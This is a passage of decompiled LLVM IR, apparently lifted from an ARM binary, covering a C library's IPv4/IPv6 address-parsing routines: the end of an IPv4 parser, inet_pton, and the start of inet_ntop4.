  %v2_19828 = xor i1 %v7_19820, true
  %v3_19828 = and i1 %v2_19820, %v2_19828
  br i1 %v3_19828, label %dec_label_pc_19864, label %dec_label_pc_1982c

dec_label_pc_1982c:                               ; preds = %dec_label_pc_19820
  %v0_1982c = load i32, i32* %r0.global-to-local, align 4
  %v1_1982c = inttoptr i32 %v0_1982c to i8*
  %v2_1982c = load i8, i8* %v1_1982c, align 1
  %v3_1982c = zext i8 %v2_1982c to i32
  %v3_19834 = mul nuw nsw i32 %v3_1982c, 10
  %v4_19834 = add nuw nsw i32 %v3_19834, %v0_19864
  %v1_19838 = add nsw i32 %v4_19834, -48
  %v2_1983c = icmp ugt i32 %v1_19838, 254
  %v7_1983c = icmp eq i32 %v1_19838, 255
  store i1 %v7_1983c, i1* %cpsr_z.global-to-local, align 1
  %v2_19840 = xor i1 %v7_1983c, true
  %v3_19840 = and i1 %v2_1983c, %v2_19840
  br i1 %v3_19840, label %dec_label_pc_198bc, label %dec_label_pc_19844

dec_label_pc_19844:                               ; preds = %dec_label_pc_1982c
  %v0_19844 = load i32, i32* %r1.global-to-local, align 4
  %v2_19844 = icmp eq i32 %v0_19844, 0
  store i1 %v2_19844, i1* %cpsr_z.global-to-local, align 1
  %v1_19848 = trunc i32 %v1_19838 to i8
  store i8 %v1_19848, i8* %v1_1982c, align 1
  %v0_1984c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1984c, label %dec_label_pc_19850, label %dec_label_pc_19888.backedge

dec_label_pc_19850:                               ; preds = %dec_label_pc_19844
  %v0_19850 = load i32, i32* @lr, align 4
  %v1_19850 = add i32 %v0_19850, 1
  store i32 %v1_19850, i32* @lr, align 4
  %v7_19854 = icmp eq i32 %v1_19850, 4
  store i1 %v7_19854, i1* %cpsr_z.global-to-local, align 1
  %v0_19858 = load i32, i32* %r1.global-to-local, align 4
  %v1_19858 = add i32 %v0_19858, 1
  store i32 %v1_19858, i32* %r1.global-to-local, align 4
  %v8_1985c = icmp sgt i32 %v1_19850, 4
  br i1 %v8_1985c, label %dec_label_pc_198bc, label %dec_label_pc_19888.backedge

dec_label_pc_19864:                               ; preds = %dec_label_pc_19820
  %v7_19864 = icmp eq i32 %v0_19864, 46
  store i1 %v7_19864, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19864, label %bb, label %.thread12

.thread12:                                        ; preds = %dec_label_pc_19864
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_198bc

bb:                                               ; preds = %dec_label_pc_19864
  %v1_1986c = load i32, i32* %r1.global-to-local, align 4
  %v2_1986c = urem i32 %v1_1986c, 2
  %v2_19870 = icmp eq i32 %v2_1986c, 0
  store i1 %v2_19870, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r1.global-to-local, align 4
  br i1 %v2_19870, label %dec_label_pc_198bc, label %dec_label_pc_1987c

dec_label_pc_1987c:                               ; preds = %bb
  %v0_1987c = load i32, i32* @lr, align 4
  %v7_1987c = icmp eq i32 %v0_1987c, 4
  store i1 %v7_1987c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1987c, label %dec_label_pc_198bc, label %dec_label_pc_19884

dec_label_pc_19884:                               ; preds = %dec_label_pc_1987c
  %v2_19884 = load i32, i32* %r0.global-to-local, align 4
  %v3_19884 = add i32 %v2_19884, 1
  %v4_19884 = inttoptr i32 %v3_19884 to i8*
  store i8 0, i8* %v4_19884, align 1
  %v5_19884 = load i32, i32* %r0.global-to-local, align 4
  %v6_19884 = add i32 %v5_19884, 1
  store i32 %v6_19884, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19888.backedge

dec_label_pc_19888.backedge:                      ; preds = %dec_label_pc_19884, %dec_label_pc_19844, %dec_label_pc_19850
  %v0_19888 = load i32, i32* @r4, align 4
  %v1_19888 = inttoptr i32 %v0_19888 to i8*
  %v2_19888 = load i8, i8* %v1_19888, align 1
  %v3_19888 = zext i8 %v2_19888 to i32
  %v5_19888 = add i32 %v0_19888, 1
  store i32 %v5_19888, i32* @r4, align 4
  %v2_1988c = icmp eq i8 %v2_19888, 0
  store i1 %v2_1988c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1988c, label %dec_label_pc_19888.dec_label_pc_19898_crit_edge, label %dec_label_pc_19820

dec_label_pc_19888.dec_label_pc_19898_crit_edge:  ; preds = %dec_label_pc_19888.backedge
  %v0_19898.pre = load i32, i32* @lr, align 4
  br label %dec_label_pc_19898

dec_label_pc_19898:                               ; preds = %dec_label_pc_19888.dec_label_pc_19898_crit_edge, %entry
  %v0_19898 = phi i32 [ %v0_19898.pre, %dec_label_pc_19888.dec_label_pc_19898_crit_edge ], [ 0, %entry ]
  %v7_19898 = icmp eq i32 %v0_19898, 3
  store i1 %v7_19898, i1* %cpsr_z.global-to-local, align 1
  %v7_1989c = icmp slt i32 %v0_19898, 4
  br i1 %v7_1989c, label %dec_label_pc_198bc, label %dec_label_pc_198a0

dec_label_pc_198a0:                               ; preds = %dec_label_pc_19898
  %v0_198a0 = load i32, i32* @r5, align 4
  store i32 %v0_198a0, i32* @r0, align 4
  store i32 %v2_19800, i32* @r1, align 4
  store i32 4, i32* @r2, align 4
  %v0_198ac = call i32 @memcpy()
  br label %dec_label_pc_198bc

dec_label_pc_198bc:                               ; preds = %dec_label_pc_1982c, %dec_label_pc_19850, %bb, %dec_label_pc_1987c, %.thread12, %dec_label_pc_19898, %dec_label_pc_198a0
  %storemerge = phi i32 [ 1, %dec_label_pc_198a0 ], [ 0, %dec_label_pc_19898 ], [ 0, %.thread12 ], [ 0, %dec_label_pc_1987c ], [ 0, %bb ], [ 0, %dec_label_pc_19850 ], [ 0, %dec_label_pc_1982c ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 %v6_197f8, i32* @r5, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_19898, { 1, 0 }
  uselistorder i32 %v3_19888, { 1, 0 }
  uselistorder i32 %v0_19864, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 4, 1, 3, 5, 6, 7, 0 }
  uselistorder i32* %r0.global-to-local, { 6, 1, 2, 3, 4, 5, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 2, 11, 3, 4, 1, 5, 6, 7, 8, 9, 10, 0 }
  uselistorder label %dec_label_pc_198bc, { 6, 5, 3, 2, 4, 1, 0 }
  uselistorder label %dec_label_pc_19888.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_19820, { 1, 0 }
}

define i32 @inet_pton(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %v3_198c4 = load i32, i32* @r4, align 4
  %v6_198c4 = load i32, i32* @r5, align 4
  %v9_198c4 = load i32, i32* @r6, align 4
  %v7_198c8 = icmp eq i32 %arg1, 2
  store i32 %tmp, i32* @r6, align 4
  store i32 %arg3, i32* %stack_var_-60, align 4
  br i1 %v7_198c8, label %dec_label_pc_198e8, label %dec_label_pc_198dc

dec_label_pc_198dc:                               ; preds = %entry
  %v7_198dc = icmp eq i32 %arg1, 10
  br i1 %v7_198dc, label %dec_label_pc_198fc, label %dec_label_pc_19aac

dec_label_pc_198e8:                               ; preds = %entry
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v4_198f0 = call i32 @inet_pton4(i8* %arg2, i32 %arg3)
  store i32 %v4_198f0, i32* %r0.global-to-local, align 4
  store i32 %v4_198f0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19ac4

dec_label_pc_198fc:                               ; preds = %dec_label_pc_198dc
  %v2_198fc = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_198fc, i32* %r0.global-to-local, align 4
  store i32 16, i32* @r2, align 4
  %v2_19908 = bitcast i32* %stack_var_-52 to i8*
  %v3_19908 = call i32 @__GI_memset(i8* %v2_19908, i32 0)
  store i32 %v3_19908, i32* %r0.global-to-local, align 4
  %v0_1990c = load i32, i32* @r6, align 4
  %v1_1990c = inttoptr i32 %v0_1990c to i8*
  %v2_1990c = load i8, i8* %v1_1990c, align 1
  %v3_1990c = zext i8 %v2_1990c to i32
  store i32 %v3_1990c, i32* %r3.global-to-local, align 4
  %v7_19910 = icmp eq i8 %v2_1990c, 58
  store i32 %v3_19908, i32* @r4, align 4
  %v2_19918 = add i32 %v3_19908, 16
  store i32 %v2_19918, i32* %r8.global-to-local, align 4
  br i1 %v7_19910, label %dec_label_pc_19920, label %dec_label_pc_1992c

dec_label_pc_19920:                               ; preds = %dec_label_pc_198fc
  %v1_19920 = add i32 %v0_1990c, 1
  %v2_19920 = inttoptr i32 %v1_19920 to i8*
  %v3_19920 = load i8, i8* %v2_19920, align 1
  %v4_19920 = zext i8 %v3_19920 to i32
  store i32 %v4_19920, i32* %r3.global-to-local, align 4
  store i32 %v1_19920, i32* @r6, align 4
  %v7_19924 = icmp eq i8 %v3_19920, 58
  br i1 %v7_19924, label %dec_label_pc_1992c, label %dec_label_pc_19ac0

dec_label_pc_1992c:                               ; preds = %dec_label_pc_19920, %dec_label_pc_198fc
  %v0_19930 = phi i32 [ %v1_19920, %dec_label_pc_19920 ], [ %v0_1990c, %dec_label_pc_198fc ]
  store i32 0, i32* %fp.global-to-local, align 4
  store i32 %v0_19930, i32* %sl.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v1_19a0c7 = inttoptr i32 %v0_19930 to i8*
  %v2_19a0c8 = load i8, i8* %v1_19a0c7, align 1
  %v3_19a0c9 = zext i8 %v2_19a0c8 to i32
  store i32 %v3_19a0c9, i32* %r0.global-to-local, align 4
  %v1_19a1010 = call i32 @__GI_tolower(i32 %v3_19a0c9)
  store i32 %v1_19a1010, i32* %r0.global-to-local, align 4
  store i32 %v1_19a1010, i32* @r5, align 4
  %v2_19a1412 = icmp eq i32 %v1_19a1010, 0
  br i1 %v2_19a1412, label %dec_label_pc_19a1c, label %dec_label_pc_19940

dec_label_pc_19940:                               ; preds = %dec_label_pc_1992c, %dec_label_pc_19a0c.backedge
  %v0_19944 = phi i32 [ %v1_19a10, %dec_label_pc_19a0c.backedge ], [ %v1_19a1010, %dec_label_pc_1992c ]
  %stack_var_-56.013 = phi i8 [ %stack_var_-56.0.be, %dec_label_pc_19a0c.backedge ], [ 0, %dec_label_pc_1992c ]
  store i32 ptrtoint ([17 x i8]* @global_var_1dc70.1160 to i32), i32* %sb.global-to-local, align 4
  store i32 ptrtoint ([17 x i8]* @global_var_1dc70.1160 to i32), i32* %r0.global-to-local, align 4
  %v3_1994c = call i32 @__GI_strchr(i32 ptrtoint ([17 x i8]* @global_var_1dc70.1160 to i32), i32 %v0_19944)
  %v4_1994c = trunc i32 %v3_1994c to i8
  store i32 %v3_1994c, i32* %r0.global-to-local, align 4
  %v3_19950 = icmp eq i8 %v4_1994c, 0
  %v0_19954 = load i32, i32* @r6, align 4
  %v1_19954 = add i32 %v0_19954, 1
  store i32 %v1_19954, i32* @r6, align 4
  br i1 %v3_19950, label %dec_label_pc_19970, label %dec_label_pc_1995c

dec_label_pc_1995c:                               ; preds = %dec_label_pc_19940
  %v0_1995c = load i32, i32* %sb.global-to-local, align 4
  %v2_1995c = sext i8 %v4_1994c to i32
  %v3_1995c = sub i32 %v2_1995c, %v0_1995c
  store i32 %v3_1995c, i32* %r3.global-to-local, align 4
  %v1_19960 = load i32, i32* %r7.global-to-local, align 4
  %v4_19960 = mul i32 %v1_19960, 16
  %v5_19960 = or i32 %v4_19960, %v3_1995c
  store i32 %v5_19960, i32* %r7.global-to-local, align 4
  %v3_19968 = icmp ult i32 %v5_19960, 65534
  br i1 %v3_19968, label %dec_label_pc_19a04, label %dec_label_pc_19ac0

dec_label_pc_19970:                               ; preds = %dec_label_pc_19940
  %v0_19970 = load i32, i32* @r5, align 4
  %v7_19970 = icmp eq i32 %v0_19970, 58
  br i1 %v7_19970, label %dec_label_pc_19978, label %dec_label_pc_199d4

dec_label_pc_19978:                               ; preds = %dec_label_pc_19970
  %v4_199782 = zext i8 %stack_var_-56.013 to i32
  store i32 %v4_199782, i32* %r3.global-to-local, align 4
  %v2_1997c = icmp eq i8 %stack_var_-56.013, 0
  br i1 %v2_1997c, label %dec_label_pc_19984, label %dec_label_pc_19998

dec_label_pc_19984:                               ; preds = %dec_label_pc_19978
  %v0_19984 = load i32, i32* %fp.global-to-local, align 4
  %v2_19984 = icmp eq i32 %v0_19984, 0
  br i1 %v2_19984, label %dec_label_pc_1998c, label %dec_label_pc_19ac0

dec_label_pc_1998c:                               ; preds = %dec_label_pc_19984
  %v0_1998c = load i32, i32* @r4, align 4
  store i32 %v0_1998c, i32* %fp.global-to-local, align 4
  store i32 %v1_19954, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_19a0c.backedge

dec_label_pc_19998:                               ; preds = %dec_label_pc_19978
  %v1_19998 = inttoptr i32 %v1_19954 to i8*
  %v2_19998 = load i8, i8* %v1_19998, align 1
  %v3_19998 = zext i8 %v2_19998 to i32
  store i32 %v3_19998, i32* %r3.global-to-local, align 4
  %v2_1999c = icmp eq i8 %v2_19998, 0
  br i1 %v2_1999c, label %dec_label_pc_19ac0, label %dec_label_pc_199a4

dec_label_pc_199a4:                               ; preds = %dec_label_pc_19998
  %v0_199a4 = load i32, i32* @r4, align 4
  %v1_199a4 = add i32 %v0_199a4, 2
  store i32 %v1_199a4, i32* %r3.global-to-local, align 4
  %v1_199a8 = load i32, i32* %r8.global-to-local, align 4
  %tmp38 = icmp ugt i32 %v1_199a4, %v1_199a8
  br i1 %tmp38, label %dec_label_pc_19ac0, label %dec_label_pc_199b0

dec_label_pc_199b0:                               ; preds = %dec_label_pc_199a4
  %v0_199b0 = load i32, i32* %r7.global-to-local, align 4
  %v3_199b0 = udiv i32 %v0_199b0, 256
  store i32 %v3_199b0, i32* %r2.global-to-local, align 4
  store i32 %v0_199a4, i32* %r3.global-to-local, align 4
  %v1_199b8 = trunc i32 %v3_199b0 to i8
  %v3_199b8 = inttoptr i32 %v0_199a4 to i8*
  store i8 %v1_199b8, i8* %v3_199b8, align 1
  %v4_199b8 = load i32, i32* %r3.global-to-local, align 4
  %v5_199b8 = add i32 %v4_199b8, 1
  store i32 %v5_199b8, i32* %r3.global-to-local, align 4
  %v0_199bc = load i32, i32* @r6, align 4
  store i32 %v0_199bc, i32* %sl.global-to-local, align 4
  %v0_199c0 = load i32, i32* %r7.global-to-local, align 4
  %v1_199c0 = trunc i32 %v0_199c0 to i8
  %v2_199c0 = load i32, i32* @r4, align 4
  %v3_199c0 = add i32 %v2_199c0, 1
  %v4_199c0 = inttoptr i32 %v3_199c0 to i8*
  store i8 %v1_199c0, i8* %v4_199c0, align 1
  store i32 0, i32* %r7.global-to-local, align 4
  %v0_199c8 = load i32, i32* %r3.global-to-local, align 4
  %v1_199c8 = add i32 %v0_199c8, 1
  store i32 %v1_199c8, i32* @r4, align 4
  %v0_19a0c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_19a0c.backedge

dec_label_pc_199d4:                               ; preds = %dec_label_pc_19970
  %v7_199d4 = icmp eq i32 %v0_19970, 46
  br i1 %v7_199d4, label %dec_label_pc_199dc, label %dec_label_pc_19ac0

dec_label_pc_199dc:                               ; preds = %dec_label_pc_199d4
  %v0_199dc = load i32, i32* @r4, align 4
  %v1_199dc = add i32 %v0_199dc, 4
  store i32 %v1_199dc, i32* @r5, align 4
  %v1_199e0 = load i32, i32* %r8.global-to-local, align 4
  %tmp39 = icmp ugt i32 %v1_199dc, %v1_199e0
  br i1 %tmp39, label %dec_label_pc_19ac0, label %dec_label_pc_199e8

dec_label_pc_199e8:                               ; preds = %dec_label_pc_199dc
  %v0_199ec = load i32, i32* %sl.global-to-local, align 4
  %v1_199ec = inttoptr i32 %v0_199ec to i8*
  store i32 %v0_199ec, i32* %r0.global-to-local, align 4
  %v4_199f0 = call i32 @inet_pton4(i8* %v1_199ec, i32 %v0_199dc)
  store i32 %v4_199f0, i32* %r0.global-to-local, align 4
  %tmp36 = icmp slt i32 %v4_199f0, 1
  br i1 %tmp36, label %dec_label_pc_19ac0, label %bb

bb:                                               ; preds = %dec_label_pc_199e8
  %v5_199f8 = load i32, i32* @r5, align 4
  store i32 %v5_199f8, i32* @r4, align 4
  br label %dec_label_pc_19a48

dec_label_pc_19a04:                               ; preds = %dec_label_pc_1995c
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_19a0c.backedge

dec_label_pc_19a0c.backedge:                      ; preds = %dec_label_pc_19a04, %dec_label_pc_1998c, %dec_label_pc_199b0
  %v0_19a0c = phi i32 [ %v1_19954, %dec_label_pc_1998c ], [ %v0_19a0c.pre, %dec_label_pc_199b0 ], [ %v1_19954, %dec_label_pc_19a04 ]
  %stack_var_-56.0.be = phi i8 [ 0, %dec_label_pc_1998c ], [ 0, %dec_label_pc_199b0 ], [ 1, %dec_label_pc_19a04 ]
  %v1_19a0c = inttoptr i32 %v0_19a0c to i8*
  %v2_19a0c = load i8, i8* %v1_19a0c, align 1
  %v3_19a0c = zext i8 %v2_19a0c to i32
  store i32 %v3_19a0c, i32* %r0.global-to-local, align 4
  %v1_19a10 = call i32 @__GI_tolower(i32 %v3_19a0c)
  store i32 %v1_19a10, i32* %r0.global-to-local, align 4
  store i32 %v1_19a10, i32* @r5, align 4
  %v2_19a14 = icmp eq i32 %v1_19a10, 0
  br i1 %v2_19a14, label %dec_label_pc_19a1c, label %dec_label_pc_19940

dec_label_pc_19a1c:                               ; preds = %dec_label_pc_19a0c.backedge, %dec_label_pc_1992c
  %stack_var_-56.0.lcssa = phi i8 [ 0, %dec_label_pc_1992c ], [ %stack_var_-56.0.be, %dec_label_pc_19a0c.backedge ]
  %v4_19a1c3 = zext i8 %stack_var_-56.0.lcssa to i32
  store i32 %v4_19a1c3, i32* %r3.global-to-local, align 4
  %v2_19a20 = icmp eq i8 %stack_var_-56.0.lcssa, 0
  %v0_19a8c.pre.pre = load i32, i32* @r4, align 4
  br i1 %v2_19a20, label %dec_label_pc_19a48, label %dec_label_pc_19a28

dec_label_pc_19a28:                               ; preds = %dec_label_pc_19a1c
  %v1_19a28 = add i32 %v0_19a8c.pre.pre, 2
  store i32 %v1_19a28, i32* %r3.global-to-local, align 4
  %v1_19a2c = load i32, i32* %r8.global-to-local, align 4
  %tmp40 = icmp ugt i32 %v1_19a28, %v1_19a2c
  br i1 %tmp40, label %dec_label_pc_19ac0, label %dec_label_pc_19a34

dec_label_pc_19a34:                               ; preds = %dec_label_pc_19a28
  store i32 %v0_19a8c.pre.pre, i32* %r3.global-to-local, align 4
  %v0_19a38 = load i32, i32* %r7.global-to-local, align 4
  %v3_19a38 = udiv i32 %v0_19a38, 256
  store i32 %v3_19a38, i32* %r2.global-to-local, align 4
  %v1_19a3c = trunc i32 %v3_19a38 to i8
  %v3_19a3c = inttoptr i32 %v0_19a8c.pre.pre to i8*
  store i8 %v1_19a3c, i8* %v3_19a3c, align 1
  %v4_19a3c = load i32, i32* %r3.global-to-local, align 4
  %v5_19a3c = add i32 %v4_19a3c, 1
  store i32 %v5_19a3c, i32* %r3.global-to-local, align 4
  %v0_19a40 = load i32, i32* %r7.global-to-local, align 4
  %v1_19a40 = trunc i32 %v0_19a40 to i8
  %v2_19a40 = load i32, i32* @r4, align 4
  %v3_19a40 = add i32 %v2_19a40, 1
  %v4_19a40 = inttoptr i32 %v3_19a40 to i8*
  store i8 %v1_19a40, i8* %v4_19a40, align 1
  %v0_19a44 = load i32, i32* %r3.global-to-local, align 4
  %v1_19a44 = add i32 %v0_19a44, 1
  store i32 %v1_19a44, i32* @r4, align 4
  br label %dec_label_pc_19a48

dec_label_pc_19a48:                               ; preds = %dec_label_pc_19a1c, %bb, %dec_label_pc_19a34
  %v0_19a8c.pre = phi i32 [ %v5_199f8, %bb ], [ %v1_19a44, %dec_label_pc_19a34 ], [ %v0_19a8c.pre.pre, %dec_label_pc_19a1c ]
  %v0_19a48 = load i32, i32* %fp.global-to-local, align 4
  %v2_19a48 = icmp eq i32 %v0_19a48, 0
  %v1_19a8c.pre = load i32, i32* %r8.global-to-local, align 4
  br i1 %v2_19a48, label %dec_label_pc_19a8c, label %dec_label_pc_19a50

dec_label_pc_19a50:                               ; preds = %dec_label_pc_19a48
  %v9_19a50 = icmp eq i32 %v0_19a8c.pre, %v1_19a8c.pre
  %v2_19a54 = sub i32 %v0_19a8c.pre, %v0_19a48
  store i32 %v2_19a54, i32* %r0.global-to-local, align 4
  br i1 %v9_19a50, label %dec_label_pc_19ac0, label %dec_label_pc_19a74.preheader

dec_label_pc_19a74.preheader:                     ; preds = %dec_label_pc_19a50
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19a74

dec_label_pc_19a64:                               ; preds = %dec_label_pc_19a74
  %v0_19a64 = load i32, i32* %fp.global-to-local, align 4
  %v2_19a64 = add i32 %v0_19a64, %v2_19a78
  %v3_19a64 = inttoptr i32 %v2_19a64 to i8*
  %v4_19a64 = load i8, i8* %v3_19a64, align 1
  %v3_19a68 = inttoptr i32 %v2_19a7c to i8*
  store i8 %v4_19a64, i8* %v3_19a68, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_19a70 = load i32, i32* %fp.global-to-local, align 4
  %v3_19a70 = load i32, i32* %ip.global-to-local, align 4
  %v4_19a70 = add i32 %v3_19a70, %v2_19a70
  %v5_19a70 = inttoptr i32 %v4_19a70 to i8*
  store i8 0, i8* %v5_19a70, align 1
  %v0_19a74.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_19a74.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_19a7c.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_19a74

dec_label_pc_19a74:                               ; preds = %dec_label_pc_19a74.preheader, %dec_label_pc_19a64
  %v0_19a88 = phi i32 [ %v1_19a8c.pre, %dec_label_pc_19a74.preheader ], [ %v1_19a7c.pre, %dec_label_pc_19a64 ]
  %v1_19a78 = phi i32 [ %v2_19a54, %dec_label_pc_19a74.preheader ], [ %v1_19a74.pre, %dec_label_pc_19a64 ]
  %v0_19a80 = phi i32 [ 1, %dec_label_pc_19a74.preheader ], [ %v0_19a74.pre, %dec_label_pc_19a64 ]
  %v2_19a78 = sub i32 %v1_19a78, %v0_19a80
  store i32 %v2_19a78, i32* %ip.global-to-local, align 4
  %v2_19a7c = sub i32 %v0_19a88, %v0_19a80
  store i32 %v2_19a7c, i32* @lr, align 4
  %v1_19a80 = add i32 %v0_19a80, 1
  store i32 %v1_19a80, i32* %r2.global-to-local, align 4
  %v7_19a84 = icmp slt i32 %v1_19a78, %v0_19a80
  br i1 %v7_19a84, label %dec_label_pc_19a88, label %dec_label_pc_19a64

dec_label_pc_19a88:                               ; preds = %dec_label_pc_19a74
  store i32 %v0_19a88, i32* @r4, align 4
  br label %dec_label_pc_19a8c

dec_label_pc_19a8c:                               ; preds = %dec_label_pc_19a48, %dec_label_pc_19a88
  %v0_19a8c = phi i32 [ %v0_19a88, %dec_label_pc_19a88 ], [ %v0_19a8c.pre, %dec_label_pc_19a48 ]
  %v1_19a8c = phi i32 [ %v0_19a88, %dec_label_pc_19a88 ], [ %v1_19a8c.pre, %dec_label_pc_19a48 ]
  %v9_19a8c = icmp eq i32 %v0_19a8c, %v1_19a8c
  br i1 %v9_19a8c, label %dec_label_pc_19a94, label %dec_label_pc_19ac0

dec_label_pc_19a94:                               ; preds = %dec_label_pc_19a8c
  store i32 16, i32* @r2, align 4
  %v2_19a98 = load i32, i32* %stack_var_-60, align 4
  store i32 %v2_19a98, i32* @r0, align 4
  store i32 %v2_198fc, i32* @r1, align 4
  %v0_19aa0 = call i32 @memcpy()
  store i32 %v0_19aa0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19ac4

dec_label_pc_19aac:                               ; preds = %dec_label_pc_198dc
  %v0_19aac = call i32 @__errno_location()
  store i32 %v0_19aac, i32* %r0.global-to-local, align 4
  store i32 97, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_19ab8 = inttoptr i32 %v0_19aac to i32*
  store i32 97, i32* %v2_19ab8, align 4
  %v0_19ac4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19ac4

dec_label_pc_19ac0:                               ; preds = %dec_label_pc_1995c, %dec_label_pc_19984, %dec_label_pc_199a4, %dec_label_pc_19998, %dec_label_pc_199e8, %dec_label_pc_19a50, %dec_label_pc_199d4, %dec_label_pc_19a8c, %dec_label_pc_19920, %dec_label_pc_19a28, %dec_label_pc_199dc
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19ac4

dec_label_pc_19ac4:                               ; preds = %dec_label_pc_19aac, %dec_label_pc_19a94, %dec_label_pc_198e8, %dec_label_pc_19ac0
  %v0_19ac4 = phi i32 [ %v0_19ac4.pre, %dec_label_pc_19aac ], [ 1, %dec_label_pc_19a94 ], [ %v4_198f0, %dec_label_pc_198e8 ], [ 0, %dec_label_pc_19ac0 ]
  store i32 %v0_19ac4, i32* %r0.global-to-local, align 4
  store i32 %v3_198c4, i32* @r4, align 4
  store i32 %v6_198c4, i32* @r5, align 4
  store i32 %v9_198c4, i32* @r6, align 4
  ret i32 %v0_19ac4

; uselistorder directives
  uselistorder i32 %v0_19ac4, { 1, 0 }
  uselistorder i32 %v2_19a7c, { 1, 0 }
  uselistorder i32 %v2_19a78, { 1, 0 }
  uselistorder i32 %v0_19a80, { 0, 1, 3, 2 }
  uselistorder i32 %v0_19a88, { 1, 0, 2, 3 }
  uselistorder i32 %v1_19a8c.pre, { 0, 2, 1 }
  uselistorder i32 %v0_19a8c.pre, { 2, 0, 1 }
  uselistorder i32 %v3_19a38, { 1, 0 }
  uselistorder i32 %v0_19a8c.pre.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_19a10, { 1, 2, 3, 0 }
  uselistorder i32 %v0_199ec, { 1, 0 }
  uselistorder i32 %v3_199b0, { 1, 0 }
  uselistorder i32 %v0_199a4, { 1, 0, 2 }
  uselistorder i32 %v1_19954, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v3_1994c, { 1, 0 }
  uselistorder i32 %v0_19930, { 1, 0 }
  uselistorder i32* %sl.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %r7.global-to-local, { 2, 3, 0, 4, 5, 1, 6, 7 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 5, 6, 4, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 7, 5, 6, 13, 12, 9, 8, 11, 10, 2, 1, 15, 14, 17, 16, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 0 }
  uselistorder i32* %fp.global-to-local, { 1, 2, 3, 0, 4, 5 }
  uselistorder i8 1, { 4, 0, 3, 6, 7, 1, 2, 8, 5, 9, 10, 11, 12 }
  uselistorder i32 58, { 3, 0, 1, 2, 4 }
  uselistorder i32 (i32)* @__GI_tolower, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_19ac4, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_19ac0, { 7, 5, 9, 4, 10, 6, 2, 3, 1, 0, 8 }
  uselistorder label %dec_label_pc_19a8c, { 1, 0 }
  uselistorder label %dec_label_pc_19a74, { 1, 0 }
  uselistorder label %dec_label_pc_19a48, { 2, 0, 1 }
  uselistorder label %dec_label_pc_19a0c.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_19940, { 1, 0 }
}

define i32 @inet_ntop4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-51 = alloca i32, align 4
  %stack_var_-53 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_19ad4 = load i32, i32* @r4, align 4
  store i32 %v3_19ad4, i32* %stack_var_-36, align 4
  store i32 %arg3, i32* %stack_var_-64, align 4
  store i32 ptrtoint (i32* @global_var_1dc5c.1162 to i32), i32* @r1, align 4
  store i32 2, i32* @r2, align 4
  store i32 %arg1, i32* %fp.global-to-local, align 4
  %v2_19af0 = ptrtoint i32* %stack_var_-53 to i32
